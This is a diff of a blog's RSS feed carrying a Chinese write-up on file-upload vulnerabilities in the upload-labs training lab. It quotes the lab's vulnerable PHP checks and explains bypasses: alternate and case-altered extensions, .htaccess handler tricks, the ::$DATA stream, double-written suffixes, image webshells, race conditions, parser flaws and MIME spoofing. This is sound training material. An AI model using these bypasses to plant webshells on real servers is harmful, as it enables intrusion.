-                 $is_upload &amp;#x3D; true;
-            &amp;#125; else &amp;#123;
-                $msg &amp;#x3D; &amp;#39;上传出错！&amp;#39;;
-            &amp;#125;
-        &amp;#125; else &amp;#123;
-            $msg &amp;#x3D; &amp;#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&amp;#39;;
-        &amp;#125;
-    &amp;#125; else &amp;#123;
-        $msg &amp;#x3D; UPLOAD_PATH . &amp;#39;文件夹不存在,请手工创建！&amp;#39;;
-    &amp;#125;
-&amp;#125;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;strrchr()&lt;/strong&gt; 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;array()&lt;/strong&gt; 函数用于创建数组。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;数组类型：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;数值数组&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;带有数字 ID 键的数组&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;关联数组&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;带有指定的键的数组，每个键关联一个值&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;多维数组&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;包含一个或多个数组的数组&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;trim()&lt;/strong&gt; 函数移除字符串两侧的空白字符或其他预定义字符。&lt;/p&gt;
-&lt;p&gt;相关函数：&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;ltrim()&lt;/strong&gt;： 移除字符串左侧的空白字符或其他预定义字符。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;rtrim()&lt;/strong&gt; 移除字符串右侧的空白字符或其他预定义字符。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;strtolower(string)&lt;/strong&gt; 函数把字符串转换为小写。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;str_ireplace()&lt;/strong&gt; 函数替换字符串中的一些字符（不区分大小写）&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;in_array()&lt;/strong&gt; 函数搜索数组中是否存在指定的值。如果在数组中找到值则返回 TRUE，否则返回 FALSE&lt;/p&gt;
-&lt;h4 id=&#34;绕过方法-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过方法-2&#34;&gt;#&lt;/a&gt; 绕过方法&lt;/h4&gt;
-&lt;p&gt;只需要构造黑名单以外的后缀名即可进行绕过，所以我们上传后缀名为 &lt;code&gt;.php1、.php2、phtml&lt;/code&gt;  等等都可以完成绕过，然后成功上传了一句话木马，用菜刀或者蚁剑连接即可&lt;/p&gt;
-&lt;h4 id=&#34;注意&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注意&#34;&gt;#&lt;/a&gt; 注意&lt;/h4&gt;
-&lt;p&gt;要在 apache 的 httpd.conf 中有如下配置代码：AddType application/x-httpd-php .php .phtml .phps .php5 .pht，如果不配置他是无法解析 php5 代码的&lt;/p&gt;
-&lt;p&gt;PHPStudy 中 AddType application/x-httpd-php 等 Apache 命令之所以在 Apache 的设置文件中设置后未实现目标效果是由于 PHP 的版本不符导致的，但注意这里的 PHP 版本并不是指 PHP7.3.0、PHP7.4.0 这种版本号，也不是适用于 32 位的 PHP、适用于 64 位的 PHP 这种不同机型的版本，而&lt;strong&gt;是 PHP 的 NTS (Non Thread Safe) 与 TS (Thread Safe) 的这种不同版本导致的&lt;/strong&gt;。&lt;/p&gt;
-&lt;h3 id=&#34;htaccess文件绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#htaccess文件绕过&#34;&gt;#&lt;/a&gt; .htaccess 文件绕过&lt;/h3&gt;
-&lt;p&gt;.htaccess 文件，全称是超文本入口，提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。&lt;/p&gt;
-&lt;p&gt;.htaccess 文件内容&lt;/p&gt;
-&lt;p&gt;AddType application/x-httpd-php .jpg&lt;/p&gt;
-&lt;p&gt;这样配置有一个问题，apache 会将所有的文件当作 php 文件解析，这样会明显影响系统的功能，改进代码如下，这样系统就只对文件名包含 “info.png” 字符串的文件进行解析. &amp;lt;FilesMatch &amp;quot;info.png&amp;quot;&amp;gt; setHandler application/x-httpd-php &amp;lt;/FilesMatch&amp;gt;&lt;/p&gt;
-&lt;h4 id=&#34;注意-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注意-2&#34;&gt;#&lt;/a&gt; 注意&lt;/h4&gt;
-&lt;p&gt;.htaccess 文件没有名字，他就是.htaccess 文件，如果你将他改为 4.htaccess 或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;如果以上操作都弄好了，还是出不来，还是去改 phpstudy 配置文件，其他选项菜单 -- 打开配置文件 ---httpd.conf&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2509712-20211105170239261-2058341176.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;箭头指向位置一开始 none, 改为 all 保存，重启 phpstudy，就可以了。&lt;/p&gt;
-&lt;h6 id=&#34;大小写绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#大小写绕过&#34;&gt;#&lt;/a&gt; 大小写绕过&lt;/h6&gt;
-&lt;p&gt;代码中没有对后缀名进行大小写过滤，而且 windows 对大小写不敏感&lt;/p&gt;
-&lt;h6 id=&#34;空格绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#空格绕过&#34;&gt;#&lt;/a&gt; 空格绕过&lt;/h6&gt;
-&lt;p&gt;前提：Windows 下 xx.jpg [空格] 或者 xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows 会默认去除空格或点&lt;/p&gt;
-&lt;p&gt;它没有 trim () 函数，也就是用来去除字符串两端的空格，所以我们如果在上传文件的后缀名里面加上空格，它在黑名单之外，我们就可以成功进行上传&lt;/p&gt;
-&lt;h6 id=&#34;点绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#点绕过&#34;&gt;#&lt;/a&gt; 点绕过&lt;/h6&gt;
-&lt;p&gt;它没有 deldot () 函数，也就是不会删除我们文件名末尾的点 (.)，所以我们可以上传带有小数点的后缀名来进行绕过&lt;/p&gt;
-&lt;h6 id=&#34;流文件绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#流文件绕过&#34;&gt;#&lt;/a&gt; 流文件绕过&lt;/h6&gt;
-&lt;p&gt;我们可以在后缀名后面加上::$DATA 来进行绕过。&lt;/p&gt;
-&lt;h6 id=&#34;点空格点绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#点空格点绕过&#34;&gt;#&lt;/a&gt; 点空格点绕过&lt;/h6&gt;
-&lt;p&gt;它没有循环验证，也就是说这些收尾去空，删除末尾的点，去除字符串::$DATA，转换为小写这些东西只是验证了一次。所以我们的绕过思路就很简单，在数据包中把后缀名改为.php. .&lt;/p&gt;
-&lt;h6 id=&#34;后缀名双写绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后缀名双写绕过&#34;&gt;#&lt;/a&gt; 后缀名双写绕过&lt;/h6&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$file_name &amp;#x3D; str_ireplace($deny_ext,&amp;quot;&amp;quot;, $file_name);&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;它将 $deny_ext 这个数组里的数据都替换成了空，参考 sql 注入里的双写便可完成绕过。&lt;/p&gt;
-&lt;p&gt;1.phphpp&lt;/p&gt;
-&lt;p&gt;1.php&lt;/p&gt;
-&lt;h2 id=&#34;图片马绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#图片马绕过&#34;&gt;#&lt;/a&gt; 图片马绕过&lt;/h2&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;function getReailFileType($filename)&amp;#123;
-    $file &amp;#x3D; fopen($filename, &amp;quot;rb&amp;quot;);&amp;#x2F;&amp;#x2F;打开一个文件或 URL。&amp;quot;rb&amp;quot; 以二进制方式打开。
-    $bin &amp;#x3D; fread($file, 2); &amp;#x2F;&amp;#x2F;只读2字节
-    fclose($file);
-    $strInfo &amp;#x3D; @unpack(&amp;quot;C2chars&amp;quot;, $bin);    
-    $typeCode &amp;#x3D; intval($strInfo[&amp;#39;chars1&amp;#39;].$strInfo[&amp;#39;chars2&amp;#39;]);    
-    $fileType &amp;#x3D; &amp;#39;&amp;#39;;    
-    switch($typeCode)&amp;#123;      
-        case 255216:            
-            $fileType &amp;#x3D; &amp;#39;jpg&amp;#39;;
-            break;
-        case 13780:            
-            $fileType &amp;#x3D; &amp;#39;png&amp;#39;;
-            break;        
-        case 7173:            
-            $fileType &amp;#x3D; &amp;#39;gif&amp;#39;;
-            break;
-        default:            
-            $fileType &amp;#x3D; &amp;#39;unknown&amp;#39;;
-        &amp;#125;    
-        return $fileType;
-&amp;#125;
-
-$is_upload &amp;#x3D; false;
-$msg &amp;#x3D; null;
-if(isset($_POST[&amp;#39;submit&amp;#39;]))&amp;#123;
-    $temp_file &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
-    $file_type &amp;#x3D; getReailFileType($temp_file);
-
-    if($file_type &amp;#x3D;&amp;#x3D; &amp;#39;unknown&amp;#39;)&amp;#123;
-        $msg &amp;#x3D; &amp;quot;文件未知，上传失败！&amp;quot;;
-    &amp;#125;else&amp;#123;
-        $img_path &amp;#x3D; UPLOAD_PATH.&amp;quot;&amp;#x2F;&amp;quot;.rand(10, 99).date(&amp;quot;YmdHis&amp;quot;).&amp;quot;.&amp;quot;.$file_type;
-        if(move_uploaded_file($temp_file,$img_path))&amp;#123;
-            $is_upload &amp;#x3D; true;
-        &amp;#125; else &amp;#123;
-            $msg &amp;#x3D; &amp;quot;上传出错！&amp;quot;;
-        &amp;#125;
-    &amp;#125;
-&amp;#125;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;图片马制作方法： copy a.jpg/b + shell.php/a shell.jpg/b 表示一个二进制文件 + 表示将多个文件合并成一个文件 /a 表示一个 ASCII 文本文件&lt;/p&gt;
-&lt;p&gt;fopen () 函数打开一个文件或 URL。&amp;quot;rb&amp;quot; 以二进制方式打开。&lt;/p&gt;
-&lt;p&gt;fread () 函数读取打开的文件。&lt;/p&gt;
-&lt;p&gt;fclose () 函数关闭一个打开文件&lt;/p&gt;
-&lt;p&gt;unpack () 函数从二进制字符串对数据进行解包。&lt;/p&gt;
-&lt;p&gt;intval () 函数用于获取变量的整数值。&lt;/p&gt;
-&lt;h2 id=&#34;条件竞争上传&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#条件竞争上传&#34;&gt;#&lt;/a&gt; 条件竞争上传&lt;/h2&gt;
-&lt;p&gt;条件竞争漏洞是一种服务器端漏洞，由于服务器端在处理用户请求时，是并发进行的，因此 如果并非处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。&lt;/p&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$is_upload &amp;#x3D; false;
-$msg &amp;#x3D; null;
-
-if(isset($_POST[&amp;#39;submit&amp;#39;]))
-&amp;#123;
-    $ext_arr &amp;#x3D; array(&amp;#39;jpg&amp;#39;,&amp;#39;png&amp;#39;,&amp;#39;gif&amp;#39;);
-    $file_name &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;];
-    $temp_file &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
-    $file_ext &amp;#x3D; substr($file_name,strrpos($file_name,&amp;quot;.&amp;quot;)+1);
-    $upload_file &amp;#x3D; UPLOAD_PATH . &amp;#39;&amp;#x2F;&amp;#39; . $file_name;
-
-    if(move_uploaded_file($temp_file, $upload_file))
-    &amp;#123;
-        if(in_array($file_ext,$ext_arr))
-        &amp;#123;
-             $img_path &amp;#x3D; UPLOAD_PATH . &amp;#39;&amp;#x2F;&amp;#39;. rand(10, 99).date(&amp;quot;YmdHis&amp;quot;).&amp;quot;.&amp;quot;.$file_ext;
-             rename($upload_file, $img_path);&amp;#x2F;&amp;#x2F;将$upload_file名字改为$img_path
-             $is_upload &amp;#x3D; true;
-        &amp;#125;
-     else
-        &amp;#123;
-            $msg &amp;#x3D; &amp;quot;只允许上传.jpg|.png|.gif类型文件！&amp;quot;;
-            unlink($upload_file);
-        &amp;#125;
-    &amp;#125;else&amp;#123;
-        $msg &amp;#x3D; &amp;#39;上传出错！&amp;#39;;
-    &amp;#125;
-&amp;#125;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;p&gt;strrpos () 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）&lt;/p&gt;
-&lt;p&gt;substr () 函数返回字符串的一部分。&lt;/p&gt;
-&lt;p&gt;rename () 函数重命名文件或目录。若成功，则该函数返回 true。若失败，则返回 false。&lt;/p&gt;
-&lt;p&gt;unlink () 函数删除文件。如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -3942,6 +3644,242 @@ if(isset($_POST[&amp;#39;submit&amp;#39;]))
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://blog.xcu.icu/2022/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid>
+            <title>文件上传小结</title>
+            <link>https://blog.xcu.icu/2022/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
+            <category term="Web" scheme="https://blog.xcu.icu/categories/Web/" />
+            <category term="文件上传" scheme="https://blog.xcu.icu/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" />
+            <pubDate>Mon, 24 Oct 2022 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;[TOC]&lt;/p&gt;
+&lt;h1 id=&#34;文件上传漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件上传漏洞&#34;&gt;#&lt;/a&gt; 文件上传漏洞&lt;/h1&gt;
+&lt;p&gt;在文件上传漏洞中，文件上传本身没什么问题，重点是文件上传到服务器后，服务器怎么解析上传的文件，上传漏洞的成因是开发者没有对用户上传的文件进行严格的过滤，攻击者可以上传危险文件&lt;/p&gt;
+&lt;h1 id=&#34;解析漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解析漏洞&#34;&gt;#&lt;/a&gt; 解析漏洞&lt;/h1&gt;
+&lt;p&gt;攻击者利用上传漏洞通常会与 web 容器的解析漏洞相结合，下面简单记录一下常见的 web 容器的解析漏洞&lt;/p&gt;
+&lt;h2 id=&#34;iis解析漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iis解析漏洞&#34;&gt;#&lt;/a&gt; IIS 解析漏洞&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;iis 中当文件夹命名为【*.asa】或者【**.asp】时，其目录下的所有文件都会被当作 asp 文件来解析&lt;/li&gt;
+&lt;li&gt;当文件为 *.asp;1.jpg 时，IIS6.0 同样会将文件当作 asp 解析&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;apache解析漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache解析漏洞&#34;&gt;#&lt;/a&gt; Apache 解析漏洞&lt;/h2&gt;
+&lt;p&gt;Apache 解析文件时有一个原则就是当碰到不认识的扩展名的时候会从后向前解析，知道遇到认识的为止，如果都不认识则会暴漏其源码&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;其认识的文件扩展名在&amp;#x2F;conf&amp;#x2F;mime.types文件下记录&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221015200221694.png&#34; alt=&#34;image-20221015200221694&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;php-cgi解析漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php-cgi解析漏洞&#34;&gt;#&lt;/a&gt; PHP CGI 解析漏洞&lt;/h2&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1waHBjZ2ktZHc3aXI3Y245MGJpMjdhMmIzYm9td2pxNWMuZmk=&#34;&gt;在 php 的配置文件中 cgi.fi&lt;/span&gt;:x_pathinfo 在部分版本中默认开启，多数存在于 nginx 与 php 的组合中，当末尾文件不存在时，会向前递归解析&lt;/p&gt;
+&lt;h1 id=&#34;简单waf绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简单waf绕过&#34;&gt;#&lt;/a&gt; 简单 waf 绕过&lt;/h1&gt;
+&lt;p&gt;下面两张是 upload-labs 中的图，总结了文件上传常见 waf 的测试方法和绕过思路&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221015201545404.png&#34; alt=&#34;image-20221015201545404&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221015201347065.png&#34; alt=&#34;image-20221015201347065&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;想要绕过限制，首先要得知道，开发人员通常通过哪些方法防止文件上传漏洞&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;客户端验证：客户端使用 Javascript 检测，在文件未上传的时候就对文件进行检测&lt;/li&gt;
+&lt;li&gt;服务端验证：在服务端检查文件的 mime 类型，扩展名是否合法，检查文件内容等等&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;下面基于upload的绕过总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下面基于upload的绕过总结&#34;&gt;#&lt;/a&gt; 下面基于 upload 的绕过总结&lt;/h1&gt;
+&lt;h2 id=&#34;前端js绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前端js绕过&#34;&gt;#&lt;/a&gt; 前端 JS 绕过&lt;/h2&gt;
+&lt;h3 id=&#34;方法一&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法一&#34;&gt;#&lt;/a&gt; 方法一&lt;/h3&gt;
+&lt;p&gt;浏览器禁用 js 验证&lt;/p&gt;
+&lt;h3 id=&#34;方法二&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法二&#34;&gt;#&lt;/a&gt; 方法二&lt;/h3&gt;
+&lt;p&gt;用 burp 抓包修改&lt;/p&gt;
+&lt;p&gt;将后缀名改成 php&lt;/p&gt;
+&lt;h2 id=&#34;content-typemime绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#content-typemime绕过&#34;&gt;#&lt;/a&gt; Content-Type（mime）绕过&lt;/h2&gt;
+&lt;p&gt;所谓 Content-Type 就是互联网媒体类型也就是 MIME 类型，决定浏览器将以什么形式、什么编码读取这个文件&lt;/p&gt;
+&lt;p&gt;先判断我们用 POST 方式提交 (标签名为 submit) 的变量是否存在，如果存在，则接下来判断 upload 这个文件夹是否存在，如果存在则继续判断我们上传文件的文件类型，如果其文件类型为 image/jpeg 或者为 image/png 或者为 image/gif，那么让 temp_file 这个变量获取存储在服务器中文件的临时名称，然后让 img_path 这个变量为 upload+/+ 被上传文件的名称。再进行判断如果 move_uploaded_file () 函数返回 ture (也就是成功将文件移动到 img_path 路径下) 那么 is_upload 变量为 true，即上传成功&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;$is_upload &amp;#x3D; false;
+$msg &amp;#x3D; null;
+if (isset($_POST[&amp;#39;submit&amp;#39;]))&amp;#x2F;&amp;#x2F;判断我们用POST方式提交(标签名为submit)的变量是否存在
+&amp;#123;
+    if (file_exists(UPLOAD_PATH)) &amp;#x2F;&amp;#x2F;判断upload这个文件夹是否存在
+    &amp;#123;
+        if (($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;type&amp;#39;] &amp;#x3D;&amp;#x3D; &amp;#39;image&amp;#x2F;jpeg&amp;#39;) || ($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;type&amp;#39;] &amp;#x3D;&amp;#x3D; &amp;#39;image&amp;#x2F;png&amp;#39;) || ($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;type&amp;#39;] &amp;#x3D;&amp;#x3D; &amp;#39;image&amp;#x2F;gif&amp;#39;)) &amp;#x2F;&amp;#x2F;判断我们上传文件的文件类型
+        &amp;#123;
+            $temp_file &amp;#x3D; $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
+            $img_path &amp;#x3D; UPLOAD_PATH . &amp;#39;&amp;#x2F;&amp;#39; . $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]&amp;#x2F;&amp;#x2F;upload+&amp;#x2F;+文件名
+            if (move_uploaded_file($temp_file, $img_path)) &amp;#x2F;&amp;#x2F;将文件移动到img_path路径下
+            &amp;#123;
+                $is_upload &amp;#x3D; true;
+            &amp;#125; else &amp;#123;
+                $msg &amp;#x3D; &amp;#39;上传出错！&amp;#39;;
+            &amp;#125;
+        &amp;#125; else &amp;#123;
+            $msg &amp;#x3D; &amp;#39;文件类型不正确，请重新上传！&amp;#39;;
+        &amp;#125;
+    &amp;#125; else &amp;#123;
+        $msg &amp;#x3D; UPLOAD_PATH.&amp;#39;文件夹不存在,请手工创建！&amp;#39;;
+    &amp;#125;
+&amp;#125;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;isset ()，用于检测变量是否设置，并且不是 NULL。如果该变量存在且非空则返回 TRUE，否则返回 FALSE&lt;/p&gt;
+&lt;p&gt;file_exists ()，检查文件或目录是否存在。如果指定的文件或目录存在则返回 true，否则返回 false。&lt;/p&gt;
+&lt;p&gt;move_uploaded_file (), 将上传的文件移动到新位置若成功，则返回 true，否则返回 false。&lt;/p&gt;
+&lt;p&gt;$FILES，FILES 是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $*FILES 为二维数组；如果为多个文件上传，那么 $*FILES 为三维数组。_&lt;/p&gt;
+&lt;p&gt;$_FILES&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjc0My5odG1sIw==&#34;&gt;&#39;userfile&#39;&lt;/span&gt; 客户端文件的原名称。&lt;/p&gt;
+&lt;p&gt;$_FILES&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjc0My5odG1sIw==&#34;&gt;&#39;userfile&#39;&lt;/span&gt; 文件的 MIME 类型，需要浏览器提供该信息的支持，例如 “image/gif”。&lt;/p&gt;
+&lt;p&gt;$_FILES&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNjc0My5odG1sIw==&#34;&gt;&#39;userfile&#39;&lt;/span&gt; 文件被上传后在服务端储存的临时文件名&lt;/p&gt;
+&lt;h3 id=&#34;绕过方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过方法&#34;&gt;#&lt;/a&gt; 绕过方法&lt;/h3&gt;
+&lt;p&gt;进行抓包，将 Content-Type 修改为允许上传的类型（image/jpeg、image/png、image/gif）三选一。&lt;/p&gt;
